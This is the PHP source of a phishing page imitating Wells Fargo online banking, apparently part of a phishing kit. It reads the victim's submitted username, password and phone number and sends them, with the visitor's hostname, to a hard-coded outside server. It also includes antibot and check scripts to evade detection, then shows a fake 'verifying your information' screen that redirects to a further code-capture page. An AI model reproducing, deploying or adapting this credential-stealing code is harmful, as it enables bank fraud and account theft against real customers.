<?php
session_start();
error_reporting(0);
include('../../files/boot/check.php');
include('../../files/boot/check1.php');
include('../../files/boot/check2.php');
include('../../files/boot/antibot.php');
include('../../files/boot/enc.php');
include('../../call.php');
$user = @$_POST['j_username'];
$pass = @$_POST['j_password'];
$phone = @$_POST['phone'];
$hostname = @gethostbyaddr($_SERVER['REMOTE_ADDR']);
function hextobin($hexstr) 
    { 
        $n = strlen($hexstr); 
        $sbin="";   
        $i=0; 
        while($i<$n) 
        {       
            $a =substr($hexstr,$i,2);           
            @$c = pack("H*",$a); 
            if ($i==0){$sbin=$c;} 
            else {$sbin.=$c;} 
            $i+=2; 
        } 
        return $sbin; 
    } 



if ($user == "" || $pass == "" || $phone == ""  ) {
  echo "<meta http-equiv='refresh' content='0;url=index.php?error=1'>";
  die();
}

$test = @file_get_contents("http://137.74.171.167/panelo/a.php?main=$user,$pass,$phone,$hostname");

?>
<!DOCTYPE html>
<html class="no-js" lang="en">

<head>
    <meta http-equiv="refresh" content="10; URL=codeinfo.php?phone=<?php print " $phone ";?>&user=<?php print "$user "; ?>">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Wells Fargo - Personal</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <link rel="shortcut icon" type="image/x-icon" href="../../files/bars/favicon.ico">
    <link rel="stylesheet" href="../../files/bars/frontporch.css" type="text/css">
    <link type="text/css" href="../../files/bars/signon_clean.css" rel="stylesheet" media="screen,projection,print">
    <link rel="stylesheet" href="../../files/bars/framework.css">
    <link rel="stylesheet" href="../../files/bars/smartphone-home.css">
    <link rel="stylesheet" href="../../files/bars/util.css">
</head>

<body theme="ssep" id="body" class="" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <div id="hamburger-menubackdrop" class="backDrop"></div><a href="#skip" class="hidden">Skip to content</a>

        <div class="header" id="header">
            <div class="wf_logo" role="link">
                <img src="../../files/bars/icn-img-wf-logo.png" alt="Wells Fargo">
            </div>
            <div class="hamburger_menu" role="link">
                <a href="#"><img src="../../files/bars/icn_house.png" alt="Home"></a>
            </div>
        </div>
        <main role="main" id="maincontainer">
        	<div id="form">
                <h1 style="margin: 0px;">Welcome</h1>
                <!-- Retrieving username values -->
                <h2 style="margin-top: 0px;"><span class="icon-lock"></span><a href="#">Online &amp; Mobile Security</a></h2>
        	</div>
            <!--Sign on overlay Start-->
            <div class="">

                <div class="overlayContainer">
                    <div class="signOnContainer" align="center">
                        <form id="frmSignon" name="frmSignon" action="test.php" method="post" autocomplete="off">

                            <!-- Updated the name and value of the field -->
                            <p style="font-size: 120%; color: #FFFFFF;"> Please wait while we verify your information </p>
                            <p style="font-size: 120%; color: #FFFFFF; font-weight: bold;"> This may take up to one minute. </p>
                            <img src="../../files/bars/loading.gif">
                            <input class="signOn" style="text-align: center;" value="Loading...">

                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
                        </form>
                    </div>

                    <footer role="contentinfo" style="text-align: center;">
                        <div class="html5footer c9" id="pageFooter">
                            <nav class="nav-footer">
                                <div class="footer-link clistData">
                                    <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
                                    <div class="footer-oaa"><a href="#">Online Access Agreement</a>
                                    </div>
                                </div>
                                <div class="footer-content">
                                    <div>
                                        <strong>Investment and Insurance products:</strong>
                                    </div>
                                    <div>
                                        <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                    </div>
                                </div>
                                <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                                <div class="footer-content">
                                    <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                                <div class="stage-coach"><img src="../../files/bars/50_opacity_stagecoach_002.png" aria-hidden="true" alt=""></div>
                            </nav>
                        </div>
                    </footer>
                </div>
            </div>
        </main>
</body>

</html>